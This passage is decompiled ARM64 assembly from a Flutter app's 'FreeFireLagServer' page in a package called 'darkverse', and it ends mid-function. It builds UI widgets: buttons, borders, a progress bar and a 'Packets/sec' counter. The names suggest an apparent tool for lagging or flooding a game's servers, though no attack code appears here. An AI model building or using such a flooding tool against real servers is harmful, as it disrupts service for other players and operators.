    // 0x876f04: StoreField: r3->field_b = r1
    //     0x876f04: stur            w1, [x3, #0xb]
    // 0x876f08: r1 = LoadStaticField(0xd6c)
    //     0x876f08: ldr             x1, [THR, #0x78]  ; THR::field_table_values
    //     0x876f0c: ldr             x1, [x1, #0x1ad8]
    // 0x876f10: tbz             w1, #4, #0x876f20
    // 0x876f14: mov             x0, x3
    // 0x876f18: r5 = Null
    //     0x876f18: mov             x5, NULL
    // 0x876f1c: b               #0x876f38
    // 0x876f20: ldur            x2, [fp, #-0x10]
    // 0x876f24: r1 = Function '<anonymous closure>':.
    //     0x876f24: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3be18] AnonymousClosure: (0x877a20), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::build (0x876058)
    //     0x876f28: ldr             x1, [x1, #0xe18]
    // 0x876f2c: r0 = AllocateClosure()
    //     0x876f2c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x876f30: mov             x5, x0
    // 0x876f34: ldur            x0, [fp, #-0x30]
    // 0x876f38: ldur            x3, [fp, #-0x20]
    // 0x876f3c: ldur            x2, [fp, #-0x28]
    // 0x876f40: ldur            x1, [fp, #-8]
    // 0x876f44: stur            x5, [fp, #-0x10]
    // 0x876f48: r0 = Color()
    //     0x876f48: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876f4c: mov             x1, x0
    // 0x876f50: r0 = Instance_ColorSpace
    //     0x876f50: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x876f54: stur            x1, [fp, #-0x18]
    // 0x876f58: StoreField: r1->field_27 = r0
    //     0x876f58: stur            w0, [x1, #0x27]
    // 0x876f5c: d0 = 1.000000
    //     0x876f5c: fmov            d0, #1.00000000
    // 0x876f60: StoreField: r1->field_7 = d0
    //     0x876f60: stur            d0, [x1, #7]
    // 0x876f64: d1 = 0.294118
    //     0x876f64: add             x17, PP, #0x21, lsl #12  ; [pp+0x21448] IMM: double(0.29411764705882354) from 0x3fd2d2d2d2d2d2d3
    //     0x876f68: ldr             d1, [x17, #0x448]
    // 0x876f6c: StoreField: r1->field_f = d1
    //     0x876f6c: stur            d1, [x1, #0xf]
    // 0x876f70: d2 = 0.090196
    //     0x876f70: add             x17, PP, #0x21, lsl #12  ; [pp+0x21450] IMM: double(0.09019607843137255) from 0x3fb7171717171717
    //     0x876f74: ldr             d2, [x17, #0x450]
    // 0x876f78: ArrayStore: r1[0] = d2  ; List_8
    //     0x876f78: stur            d2, [x1, #0x17]
    // 0x876f7c: d3 = 0.086275
    //     0x876f7c: add             x17, PP, #0x21, lsl #12  ; [pp+0x21458] IMM: double(0.08627450980392157) from 0x3fb6161616161616
    //     0x876f80: ldr             d3, [x17, #0x458]
    // 0x876f84: StoreField: r1->field_1f = d3
    //     0x876f84: stur            d3, [x1, #0x1f]
    // 0x876f88: r0 = Radius()
    //     0x876f88: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x876f8c: d0 = 12.000000
    //     0x876f8c: fmov            d0, #12.00000000
    // 0x876f90: stur            x0, [fp, #-0x38]
    // 0x876f94: StoreField: r0->field_7 = d0
    //     0x876f94: stur            d0, [x0, #7]
    // 0x876f98: StoreField: r0->field_f = d0
    //     0x876f98: stur            d0, [x0, #0xf]
    // 0x876f9c: r0 = BorderRadius()
    //     0x876f9c: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x876fa0: mov             x1, x0
    // 0x876fa4: ldur            x0, [fp, #-0x38]
    // 0x876fa8: stur            x1, [fp, #-0x40]
    // 0x876fac: StoreField: r1->field_7 = r0
    //     0x876fac: stur            w0, [x1, #7]
    // 0x876fb0: StoreField: r1->field_b = r0
    //     0x876fb0: stur            w0, [x1, #0xb]
    // 0x876fb4: StoreField: r1->field_f = r0
    //     0x876fb4: stur            w0, [x1, #0xf]
    // 0x876fb8: StoreField: r1->field_13 = r0
    //     0x876fb8: stur            w0, [x1, #0x13]
    // 0x876fbc: r0 = RoundedRectangleBorder()
    //     0x876fbc: bl              #0x58ce88  ; AllocateRoundedRectangleBorderStub -> RoundedRectangleBorder (size=0x10)
    // 0x876fc0: mov             x1, x0
    // 0x876fc4: ldur            x0, [fp, #-0x40]
    // 0x876fc8: StoreField: r1->field_b = r0
    //     0x876fc8: stur            w0, [x1, #0xb]
    // 0x876fcc: r0 = Instance_BorderSide
    //     0x876fcc: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd70] Obj!BorderSide@a28af1
    //     0x876fd0: ldr             x0, [x0, #0xd70]
    // 0x876fd4: StoreField: r1->field_7 = r0
    //     0x876fd4: stur            w0, [x1, #7]
    // 0x876fd8: r16 = Instance_EdgeInsets
    //     0x876fd8: add             x16, PP, #0x26, lsl #12  ; [pp+0x26420] Obj!EdgeInsets@a071f1
    //     0x876fdc: ldr             x16, [x16, #0x420]
    // 0x876fe0: stp             x1, x16, [SP]
    // 0x876fe4: ldur            x1, [fp, #-0x18]
    // 0x876fe8: r4 = const [0, 0x3, 0x2, 0x1, padding, 0x1, shape, 0x2, null]
    //     0x876fe8: add             x4, PP, #0x37, lsl #12  ; [pp+0x37cc0] List(9) [0, 0x3, 0x2, 0x1, "padding", 0x1, "shape", 0x2, Null]
    //     0x876fec: ldr             x4, [x4, #0xcc0]
    // 0x876ff0: r0 = styleFrom()
    //     0x876ff0: bl              #0x6a6e2c  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::styleFrom
    // 0x876ff4: stur            x0, [fp, #-0x18]
    // 0x876ff8: r0 = ElevatedButton()
    //     0x876ff8: bl              #0x6b0714  ; AllocateElevatedButtonStub -> ElevatedButton (size=0x40)
    // 0x876ffc: mov             x1, x0
    // 0x877000: ldur            x5, [fp, #-0x10]
    // 0x877004: ldur            x6, [fp, #-0x18]
    // 0x877008: r2 = Instance_Icon
    //     0x877008: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be20] Obj!Icon@a36761
    //     0x87700c: ldr             x2, [x2, #0xe20]
    // 0x877010: r3 = Instance_Text
    //     0x877010: add             x3, PP, #0x3b, lsl #12  ; [pp+0x3be28] Obj!Text@a30051
    //     0x877014: ldr             x3, [x3, #0xe28]
    // 0x877018: stur            x0, [fp, #-0x10]
    // 0x87701c: r0 = ElevatedButton.icon()
    //     0x87701c: bl              #0x6b83a8  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::ElevatedButton.icon
    // 0x877020: r1 = <FlexParentData>
    //     0x877020: add             x1, PP, #0x11, lsl #12  ; [pp+0x11550] TypeArguments: <FlexParentData>
    //     0x877024: ldr             x1, [x1, #0x550]
    // 0x877028: r0 = Expanded()
    //     0x877028: bl              #0x6b0720  ; AllocateExpandedStub -> Expanded (size=0x20)
    // 0x87702c: mov             x3, x0
    // 0x877030: r0 = 1
    //     0x877030: mov             x0, #1
    // 0x877034: stur            x3, [fp, #-0x18]
    // 0x877038: StoreField: r3->field_13 = r0
    //     0x877038: stur            x0, [x3, #0x13]
    // 0x87703c: r0 = Instance_FlexFit
    //     0x87703c: add             x0, PP, #0xc, lsl #12  ; [pp+0xcbe0] Obj!FlexFit@a40421
    //     0x877040: ldr             x0, [x0, #0xbe0]
    // 0x877044: StoreField: r3->field_1b = r0
    //     0x877044: stur            w0, [x3, #0x1b]
    // 0x877048: ldur            x0, [fp, #-0x10]
    // 0x87704c: StoreField: r3->field_b = r0
    //     0x87704c: stur            w0, [x3, #0xb]
    // 0x877050: r1 = Null
    //     0x877050: mov             x1, NULL
    // 0x877054: r2 = 6
    //     0x877054: mov             x2, #6
    // 0x877058: r0 = AllocateArray()
    //     0x877058: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87705c: mov             x2, x0
    // 0x877060: ldur            x0, [fp, #-0x30]
    // 0x877064: stur            x2, [fp, #-0x10]
    // 0x877068: StoreField: r2->field_f = r0
    //     0x877068: stur            w0, [x2, #0xf]
    // 0x87706c: r16 = Instance_SizedBox
    //     0x87706c: add             x16, PP, #0x11, lsl #12  ; [pp+0x118d8] Obj!SizedBox@a3a8a1
    //     0x877070: ldr             x16, [x16, #0x8d8]
    // 0x877074: StoreField: r2->field_13 = r16
    //     0x877074: stur            w16, [x2, #0x13]
    // 0x877078: ldur            x0, [fp, #-0x18]
    // 0x87707c: ArrayStore: r2[0] = r0  ; List_4
    //     0x87707c: stur            w0, [x2, #0x17]
    // 0x877080: r1 = <Widget>
    //     0x877080: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x877084: r0 = AllocateGrowableArray()
    //     0x877084: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x877088: mov             x1, x0
    // 0x87708c: ldur            x0, [fp, #-0x10]
    // 0x877090: stur            x1, [fp, #-0x18]
    // 0x877094: StoreField: r1->field_f = r0
    //     0x877094: stur            w0, [x1, #0xf]
    // 0x877098: r0 = 6
    //     0x877098: mov             x0, #6
    // 0x87709c: StoreField: r1->field_b = r0
    //     0x87709c: stur            w0, [x1, #0xb]
    // 0x8770a0: r0 = Row()
    //     0x8770a0: bl              #0x6b1530  ; AllocateRowStub -> Row (size=0x38)
    // 0x8770a4: mov             x3, x0
    // 0x8770a8: r0 = Instance_Axis
    //     0x8770a8: ldr             x0, [PP, #0x46d8]  ; [pp+0x46d8] Obj!Axis@a407e1
    // 0x8770ac: stur            x3, [fp, #-0x10]
    // 0x8770b0: StoreField: r3->field_f = r0
    //     0x8770b0: stur            w0, [x3, #0xf]
    // 0x8770b4: r0 = Instance_MainAxisAlignment
    //     0x8770b4: ldr             x0, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x8770b8: StoreField: r3->field_13 = r0
    //     0x8770b8: stur            w0, [x3, #0x13]
    // 0x8770bc: r4 = Instance_MainAxisSize
    //     0x8770bc: add             x4, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x8770c0: ldr             x4, [x4, #0xbc0]
    // 0x8770c4: ArrayStore: r3[0] = r4  ; List_4
    //     0x8770c4: stur            w4, [x3, #0x17]
    // 0x8770c8: r5 = Instance_CrossAxisAlignment
    //     0x8770c8: ldr             x5, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x8770cc: StoreField: r3->field_1b = r5
    //     0x8770cc: stur            w5, [x3, #0x1b]
    // 0x8770d0: r6 = Instance_VerticalDirection
    //     0x8770d0: ldr             x6, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x8770d4: StoreField: r3->field_23 = r6
    //     0x8770d4: stur            w6, [x3, #0x23]
    // 0x8770d8: r7 = Instance_Clip
    //     0x8770d8: ldr             x7, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x8770dc: StoreField: r3->field_2b = r7
    //     0x8770dc: stur            w7, [x3, #0x2b]
    // 0x8770e0: StoreField: r3->field_2f = rZR
    //     0x8770e0: stur            xzr, [x3, #0x2f]
    // 0x8770e4: ldur            x1, [fp, #-0x18]
    // 0x8770e8: StoreField: r3->field_b = r1
    //     0x8770e8: stur            w1, [x3, #0xb]
    // 0x8770ec: r1 = Null
    //     0x8770ec: mov             x1, NULL
    // 0x8770f0: r2 = 16
    //     0x8770f0: mov             x2, #0x10
    // 0x8770f4: r0 = AllocateArray()
    //     0x8770f4: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x8770f8: mov             x2, x0
    // 0x8770fc: ldur            x0, [fp, #-0x20]
    // 0x877100: stur            x2, [fp, #-0x18]
    // 0x877104: StoreField: r2->field_f = r0
    //     0x877104: stur            w0, [x2, #0xf]
    // 0x877108: r16 = Instance_SizedBox
    //     0x877108: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x87710c: ldr             x16, [x16, #0x5b0]
    // 0x877110: StoreField: r2->field_13 = r16
    //     0x877110: stur            w16, [x2, #0x13]
    // 0x877114: ldur            x0, [fp, #-0x28]
    // 0x877118: ArrayStore: r2[0] = r0  ; List_4
    //     0x877118: stur            w0, [x2, #0x17]
    // 0x87711c: r16 = Instance_SizedBox
    //     0x87711c: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x877120: ldr             x16, [x16, #0x5b0]
    // 0x877124: StoreField: r2->field_1b = r16
    //     0x877124: stur            w16, [x2, #0x1b]
    // 0x877128: ldur            x0, [fp, #-8]
    // 0x87712c: StoreField: r2->field_1f = r0
    //     0x87712c: stur            w0, [x2, #0x1f]
    // 0x877130: r16 = Instance_SizedBox
    //     0x877130: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x877134: ldr             x16, [x16, #0x5b0]
    // 0x877138: StoreField: r2->field_23 = r16
    //     0x877138: stur            w16, [x2, #0x23]
    // 0x87713c: ldur            x0, [fp, #-0x10]
    // 0x877140: StoreField: r2->field_27 = r0
    //     0x877140: stur            w0, [x2, #0x27]
    // 0x877144: r16 = Instance_SizedBox
    //     0x877144: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x877148: ldr             x16, [x16, #0x5b0]
    // 0x87714c: StoreField: r2->field_2b = r16
    //     0x87714c: stur            w16, [x2, #0x2b]
    // 0x877150: r1 = <Widget>
    //     0x877150: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x877154: r0 = AllocateGrowableArray()
    //     0x877154: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x877158: mov             x1, x0
    // 0x87715c: ldur            x0, [fp, #-0x18]
    // 0x877160: stur            x1, [fp, #-8]
    // 0x877164: StoreField: r1->field_f = r0
    //     0x877164: stur            w0, [x1, #0xf]
    // 0x877168: r2 = 16
    //     0x877168: mov             x2, #0x10
    // 0x87716c: StoreField: r1->field_b = r2
    //     0x87716c: stur            w2, [x1, #0xb]
    // 0x877170: r2 = LoadStaticField(0xd6c)
    //     0x877170: ldr             x2, [THR, #0x78]  ; THR::field_table_values
    //     0x877174: ldr             x2, [x2, #0x1ad8]
    // 0x877178: tbnz            w2, #4, #0x8775c8
    // 0x87717c: r0 = Color()
    //     0x87717c: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x877180: mov             x1, x0
    // 0x877184: r0 = Instance_ColorSpace
    //     0x877184: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x877188: StoreField: r1->field_27 = r0
    //     0x877188: stur            w0, [x1, #0x27]
    // 0x87718c: d1 = 0.760784
    //     0x87718c: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x877190: ldr             d1, [x17, #0xc40]
    // 0x877194: StoreField: r1->field_7 = d1
    //     0x877194: stur            d1, [x1, #7]
    // 0x877198: d2 = 0.956863
    //     0x877198: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x87719c: ldr             d2, [x17, #0xec8]
    // 0x8771a0: StoreField: r1->field_f = d2
    //     0x8771a0: stur            d2, [x1, #0xf]
    // 0x8771a4: ArrayStore: r1[0] = d2  ; List_8
    //     0x8771a4: stur            d2, [x1, #0x17]
    // 0x8771a8: StoreField: r1->field_1f = d2
    //     0x8771a8: stur            d2, [x1, #0x1f]
    // 0x8771ac: d0 = 0.100000
    //     0x8771ac: add             x17, PP, #0xc, lsl #12  ; [pp+0xc100] IMM: double(0.1) from 0x3fb999999999999a
    //     0x8771b0: ldr             d0, [x17, #0x100]
    // 0x8771b4: r0 = withOpacity()
    //     0x8771b4: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x8771b8: stur            x0, [fp, #-0x10]
    // 0x8771bc: r0 = Radius()
    //     0x8771bc: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x8771c0: d0 = 15.000000
    //     0x8771c0: fmov            d0, #15.00000000
    // 0x8771c4: stur            x0, [fp, #-0x20]
    // 0x8771c8: StoreField: r0->field_7 = d0
    //     0x8771c8: stur            d0, [x0, #7]
    // 0x8771cc: StoreField: r0->field_f = d0
    //     0x8771cc: stur            d0, [x0, #0xf]
    // 0x8771d0: r0 = BorderRadius()
    //     0x8771d0: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x8771d4: mov             x1, x0
    // 0x8771d8: ldur            x0, [fp, #-0x20]
    // 0x8771dc: stur            x1, [fp, #-0x28]
    // 0x8771e0: StoreField: r1->field_7 = r0
    //     0x8771e0: stur            w0, [x1, #7]
    // 0x8771e4: StoreField: r1->field_b = r0
    //     0x8771e4: stur            w0, [x1, #0xb]
    // 0x8771e8: StoreField: r1->field_f = r0
    //     0x8771e8: stur            w0, [x1, #0xf]
    // 0x8771ec: StoreField: r1->field_13 = r0
    //     0x8771ec: stur            w0, [x1, #0x13]
    // 0x8771f0: r0 = Color()
    //     0x8771f0: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x8771f4: mov             x1, x0
    // 0x8771f8: r0 = Instance_ColorSpace
    //     0x8771f8: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x8771fc: StoreField: r1->field_27 = r0
    //     0x8771fc: stur            w0, [x1, #0x27]
    // 0x877200: d1 = 0.760784
    //     0x877200: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x877204: ldr             d1, [x17, #0xc40]
    // 0x877208: StoreField: r1->field_7 = d1
    //     0x877208: stur            d1, [x1, #7]
    // 0x87720c: d2 = 0.956863
    //     0x87720c: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x877210: ldr             d2, [x17, #0xec8]
    // 0x877214: StoreField: r1->field_f = d2
    //     0x877214: stur            d2, [x1, #0xf]
    // 0x877218: ArrayStore: r1[0] = d2  ; List_8
    //     0x877218: stur            d2, [x1, #0x17]
    // 0x87721c: StoreField: r1->field_1f = d2
    //     0x87721c: stur            d2, [x1, #0x1f]
    // 0x877220: d0 = 0.300000
    //     0x877220: add             x17, PP, #0xd, lsl #12  ; [pp+0xd180] IMM: double(0.3) from 0x3fd3333333333333
    //     0x877224: ldr             d0, [x17, #0x180]
    // 0x877228: r0 = withOpacity()
    //     0x877228: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x87722c: str             x0, [SP]
    // 0x877230: r1 = Null
    //     0x877230: mov             x1, NULL
    // 0x877234: r4 = const [0, 0x2, 0x1, 0x1, color, 0x1, null]
    //     0x877234: add             x4, PP, #0xb, lsl #12  ; [pp+0xbc68] List(7) [0, 0x2, 0x1, 0x1, "color", 0x1, Null]
    //     0x877238: ldr             x4, [x4, #0xc68]
    // 0x87723c: r0 = Border.all()
    //     0x87723c: bl              #0x6b0744  ; [package:flutter/src/painting/box_border.dart] Border::Border.all
    // 0x877240: stur            x0, [fp, #-0x20]
    // 0x877244: r0 = BoxDecoration()
    //     0x877244: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x877248: mov             x1, x0
    // 0x87724c: ldur            x0, [fp, #-0x10]
    // 0x877250: stur            x1, [fp, #-0x30]
    // 0x877254: StoreField: r1->field_7 = r0
    //     0x877254: stur            w0, [x1, #7]
    // 0x877258: ldur            x0, [fp, #-0x20]
    // 0x87725c: StoreField: r1->field_f = r0
    //     0x87725c: stur            w0, [x1, #0xf]
    // 0x877260: ldur            x0, [fp, #-0x28]
    // 0x877264: StoreField: r1->field_13 = r0
    //     0x877264: stur            w0, [x1, #0x13]
    // 0x877268: r0 = Instance_BoxShape
    //     0x877268: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x87726c: ldr             x0, [x0, #0xd78]
    // 0x877270: StoreField: r1->field_23 = r0
    //     0x877270: stur            w0, [x1, #0x23]
    // 0x877274: r2 = LoadStaticField(0xd70)
    //     0x877274: ldr             x2, [THR, #0x78]  ; THR::field_table_values
    //     0x877278: ldr             x2, [x2, #0x1ae0]
    // 0x87727c: r3 = LoadInt32Instr(r2)
    //     0x87727c: sbfx            x3, x2, #1, #0x1f
    //     0x877280: tbz             w2, #0, #0x877288
    //     0x877284: ldur            x3, [x2, #7]
    // 0x877288: stur            x3, [fp, #-0x70]
    // 0x87728c: r2 = 10000
    //     0x87728c: mov             x2, #0x2710
    // 0x877290: sdiv            x5, x3, x2
    // 0x877294: msub            x4, x5, x2, x3
    // 0x877298: cmp             x4, xzr
    // 0x87729c: b.lt            #0x877870
    // 0x8772a0: scvtf           d0, x4
    // 0x8772a4: d1 = 10000.000000
    //     0x8772a4: add             x17, PP, #0x37, lsl #12  ; [pp+0x37a10] IMM: double(10000) from 0x40c3880000000000
    //     0x8772a8: ldr             d1, [x17, #0xa10]
    // 0x8772ac: fdiv            d2, d0, d1
    // 0x8772b0: stur            d2, [fp, #-0x78]
    // 0x8772b4: r0 = Color()
    //     0x8772b4: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x8772b8: mov             x1, x0
    // 0x8772bc: r0 = Instance_ColorSpace
    //     0x8772bc: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x8772c0: stur            x1, [fp, #-0x10]
    // 0x8772c4: StoreField: r1->field_27 = r0
    //     0x8772c4: stur            w0, [x1, #0x27]
    // 0x8772c8: d0 = 1.000000
    //     0x8772c8: fmov            d0, #1.00000000
    // 0x8772cc: StoreField: r1->field_7 = d0
    //     0x8772cc: stur            d0, [x1, #7]
    // 0x8772d0: d0 = 0.294118
    //     0x8772d0: add             x17, PP, #0x21, lsl #12  ; [pp+0x21448] IMM: double(0.29411764705882354) from 0x3fd2d2d2d2d2d2d3
    //     0x8772d4: ldr             d0, [x17, #0x448]
    // 0x8772d8: StoreField: r1->field_f = d0
    //     0x8772d8: stur            d0, [x1, #0xf]
    // 0x8772dc: d0 = 0.090196
    //     0x8772dc: add             x17, PP, #0x21, lsl #12  ; [pp+0x21450] IMM: double(0.09019607843137255) from 0x3fb7171717171717
    //     0x8772e0: ldr             d0, [x17, #0x450]
    // 0x8772e4: ArrayStore: r1[0] = d0  ; List_8
    //     0x8772e4: stur            d0, [x1, #0x17]
    // 0x8772e8: d0 = 0.086275
    //     0x8772e8: add             x17, PP, #0x21, lsl #12  ; [pp+0x21458] IMM: double(0.08627450980392157) from 0x3fb6161616161616
    //     0x8772ec: ldr             d0, [x17, #0x458]
    // 0x8772f0: StoreField: r1->field_1f = d0
    //     0x8772f0: stur            d0, [x1, #0x1f]
    // 0x8772f4: r0 = Color()
    //     0x8772f4: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x8772f8: mov             x1, x0
    // 0x8772fc: r0 = Instance_ColorSpace
    //     0x8772fc: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x877300: stur            x1, [fp, #-0x28]
    // 0x877304: StoreField: r1->field_27 = r0
    //     0x877304: stur            w0, [x1, #0x27]
    // 0x877308: d0 = 0.760784
    //     0x877308: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x87730c: ldr             d0, [x17, #0xc40]
    // 0x877310: StoreField: r1->field_7 = d0
    //     0x877310: stur            d0, [x1, #7]
    // 0x877314: d1 = 0.956863
    //     0x877314: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x877318: ldr             d1, [x17, #0xec8]
    // 0x87731c: StoreField: r1->field_f = d1
    //     0x87731c: stur            d1, [x1, #0xf]
    // 0x877320: ArrayStore: r1[0] = d1  ; List_8
    //     0x877320: stur            d1, [x1, #0x17]
    // 0x877324: StoreField: r1->field_1f = d1
    //     0x877324: stur            d1, [x1, #0x1f]
    // 0x877328: ldur            d2, [fp, #-0x78]
    // 0x87732c: r2 = inline_Allocate_Double()
    //     0x87732c: ldp             x2, x3, [THR, #0x60]  ; THR::top
    //     0x877330: add             x2, x2, #0x10
    //     0x877334: cmp             x3, x2
    //     0x877338: b.ls            #0x877878
    //     0x87733c: str             x2, [THR, #0x60]  ; THR::top
    //     0x877340: sub             x2, x2, #0xf
    //     0x877344: mov             x3, #0xe15c
    //     0x877348: movk            x3, #3, lsl #16
    //     0x87734c: stur            x3, [x2, #-1]
    // 0x877350: dmb             ishst
    // 0x877354: StoreField: r2->field_7 = d2
    //     0x877354: stur            d2, [x2, #7]
    // 0x877358: stur            x2, [fp, #-0x20]
    // 0x87735c: r0 = LinearProgressIndicator()
    //     0x87735c: bl              #0x6c64ec  ; AllocateLinearProgressIndicatorStub -> LinearProgressIndicator (size=0x40)
    // 0x877360: mov             x3, x0
    // 0x877364: ldur            x0, [fp, #-0x20]
    // 0x877368: stur            x3, [fp, #-0x38]
    // 0x87736c: StoreField: r3->field_b = r0
    //     0x87736c: stur            w0, [x3, #0xb]
    // 0x877370: ldur            x0, [fp, #-0x10]
    // 0x877374: StoreField: r3->field_f = r0
    //     0x877374: stur            w0, [x3, #0xf]
    // 0x877378: ldur            x0, [fp, #-0x28]
    // 0x87737c: StoreField: r3->field_13 = r0
    //     0x87737c: stur            w0, [x3, #0x13]
    // 0x877380: r1 = Null
    //     0x877380: mov             x1, NULL
    // 0x877384: r2 = 4
    //     0x877384: mov             x2, #4
    // 0x877388: r0 = AllocateArray()
    //     0x877388: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87738c: stur            x0, [fp, #-0x10]
    // 0x877390: r16 = "Packets/sec: ~"
    //     0x877390: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3be30] "Packets/sec: ~"
    //     0x877394: ldr             x16, [x16, #0xe30]
    // 0x877398: StoreField: r0->field_f = r16
    //     0x877398: stur            w16, [x0, #0xf]
    // 0x87739c: r0 = _getCurrentMicros()
    //     0x87739c: bl              #0x6b5448  ; [dart:core] DateTime::_getCurrentMicros
    // 0x8773a0: r1 = LoadInt32Instr(r0)
    //     0x8773a0: sbfx            x1, x0, #1, #0x1f
    //     0x8773a4: tbz             w0, #0, #0x8773ac
    //     0x8773a8: ldur            x1, [x0, #7]
    // 0x8773ac: tbz             x1, #0x3f, #0x8773b8
    // 0x8773b0: r5 = 999
    //     0x8773b0: mov             x5, #0x3e7
    // 0x8773b4: b               #0x8773bc
    // 0x8773b8: r5 = 0
    //     0x8773b8: mov             x5, #0
    // 0x8773bc: ldur            x2, [fp, #-0x38]
    // 0x8773c0: ldur            x3, [fp, #-8]
    // 0x8773c4: ldur            x0, [fp, #-0x70]
    // 0x8773c8: d0 = 1000.000000
    //     0x8773c8: add             x17, PP, #0x19, lsl #12  ; [pp+0x19cb8] IMM: double(1000) from 0x408f400000000000
    //     0x8773cc: ldr             d0, [x17, #0xcb8]
    // 0x8773d0: r4 = 1000
    //     0x8773d0: mov             x4, #0x3e8
    // 0x8773d4: sub             x6, x1, x5
    // 0x8773d8: sdiv            x1, x6, x4
    // 0x8773dc: scvtf           d1, x1
    // 0x8773e0: fdiv            d2, d1, d0
    // 0x8773e4: scvtf           d0, x0
    // 0x8773e8: fdiv            d1, d0, d2
    // 0x8773ec: fcmp            d1, d1
    // 0x8773f0: b.vs            #0x87789c
    // 0x8773f4: fcvtzs          x0, d1
    // 0x8773f8: asr             x16, x0, #0x1e
    // 0x8773fc: cmp             x16, x0, asr #63
    // 0x877400: b.ne            #0x87789c
    // 0x877404: lsl             x0, x0, #1
    // 0x877408: ldur            x1, [fp, #-0x10]
    // 0x87740c: ArrayStore: r1[1] = r0  ; List_4
    //     0x87740c: add             x25, x1, #0x13
    //     0x877410: str             w0, [x25]
    //     0x877414: tbz             w0, #0, #0x877430
    //     0x877418: ldurb           w16, [x1, #-1]
    //     0x87741c: ldurb           w17, [x0, #-1]
    //     0x877420: and             x16, x17, x16, lsr #2
    //     0x877424: tst             x16, HEAP, lsr #32
    //     0x877428: b.eq            #0x877430
    //     0x87742c: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x877430: ldur            x16, [fp, #-0x10]
    // 0x877434: str             x16, [SP]
    // 0x877438: r0 = _interpolate()
    //     0x877438: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x87743c: stur            x0, [fp, #-0x10]
    // 0x877440: r0 = Text()
    //     0x877440: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x877444: mov             x3, x0
    // 0x877448: ldur            x0, [fp, #-0x10]
    // 0x87744c: stur            x3, [fp, #-0x20]
    // 0x877450: StoreField: r3->field_b = r0
    //     0x877450: stur            w0, [x3, #0xb]
    // 0x877454: r0 = Instance_TextStyle
    //     0x877454: add             x0, PP, #0x3b, lsl #12  ; [pp+0x3be38] Obj!TextStyle@a23d71
    //     0x877458: ldr             x0, [x0, #0xe38]
    // 0x87745c: StoreField: r3->field_13 = r0
    //     0x87745c: stur            w0, [x3, #0x13]
    // 0x877460: r1 = Null
    //     0x877460: mov             x1, NULL
    // 0x877464: r2 = 10
    //     0x877464: mov             x2, #0xa
    // 0x877468: r0 = AllocateArray()
    //     0x877468: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87746c: stur            x0, [fp, #-0x10]
    // 0x877470: r16 = Instance_Text
